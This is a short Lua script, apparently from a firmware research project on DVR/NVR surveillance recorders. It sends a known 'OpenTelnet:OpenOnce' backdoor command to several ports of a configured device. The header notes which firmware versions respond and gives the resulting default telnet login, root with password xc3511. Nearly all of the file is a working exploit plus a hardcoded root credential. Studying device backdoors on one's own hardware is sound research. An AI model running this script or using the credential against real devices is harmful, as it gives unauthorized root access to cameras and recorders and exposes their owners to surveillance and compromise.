-- R08-Backdoors.lua

--[[
Attempts to use various backdoors described online to gain access to telnet.
https://habr.com/en/post/486856/

Tested with firmwares:
	- V4.03.R11.C6380235.12201.140000.0000000 (NVR-test)
		Doesn't have the ports 9527 or 9530 open, has other open ports: 12901, 23000, 30100. None of these react to the backdoor attempt.

	- V4.03.R11.C638014A.12201.142300.0000000 (DVR-test)
		Has the 9530 port open, reacts to Telnet:OpenOnce with the randNum response, the backdoor is successful.
		Telnet uses root / xc3511 login.

	- V4.03.R11.J5980233.12201.140000.0000001 (NVR)
		Doesn't have the ports 9527 or 9530 open, has other open ports: 23000, 30100. Neither of these react to the backdoor attempt.

	- V4.03.R11.34531191.1000 (DVR-old)
		(untested)
--]]





--- LuaSocket is used for the network communication
local socket = require("socket")

-- The specific real device's configuration, provide your own as needed (there's a RealDeviceConfig.sample.lua)
local config = require("RealDeviceConfig")




local gPortsToTry =
{
	9530,
	12901,
	23000,
	30100,
}





--- Connects to the device on the specified port, returns the socket
-- Sets a 3-second timeout on the socket (reasonable for LAN)
-- Raises an error on any failure
local function connect(aPort)
	assert(type(aPort) == "number")

	local conn = socket.tcp()
	conn:settimeout(3)
	assert(conn:connect(config.hostName, aPort))
	return conn
end





--- Tries to send a simple OpenTelnet:OpenOnce command to the specified port.
-- As discovered in https://habr.com/en/post/332526/
local function tryOpenTelnet(aPort)
	assert(type(aPort) == "number")

	local conn = assert(connect(aPort))
	local cmd = "OpenTelnet:OpenOnce"
	assert(conn:send(string.char(string.len(cmd)) .. cmd))
	print(conn:receive(100))
	conn:close()
end





for _, port in ipairs(gPortsToTry) do
	print("Trying port " .. port)
	xpcall(tryOpenTelnet, print, port)
end
